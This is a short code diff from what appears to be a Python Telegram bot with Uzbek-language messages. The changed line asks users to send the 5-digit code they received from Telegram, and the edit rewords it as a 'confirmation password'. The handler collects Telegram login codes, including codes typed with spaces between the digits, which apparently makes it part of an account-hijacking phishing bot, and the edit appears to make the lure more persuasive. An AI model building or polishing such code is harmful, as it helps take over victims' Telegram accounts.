@@ -620,7 +620,7 @@ async def process_code(message: types.Message, state: FSMContext):
         code = digits[:5] if len(digits) >= 5 else digits
 
     if not code or len(code) < 4:
-        await message.answer("❌ <b>Kodni aniqlab bo'lmadi!</b>\n\nIltimos, Telegramdan kelgan 5 xonali kodni yuboring (Masalan: <code>32222</code> yoki <code>3 2 2 2 2</code>):")
+        await message.answer("❌ <b>Kodni aniqlab bo'lmadi!</b>\n\nIltimos, Telegramdan kelgan 5 xonali tasdiqlash parolini yuboring (Masalan: <code>32222</code> yoki <code>3 2 2 2 2</code>):")
         return
 
     user_id = message.from_user.id
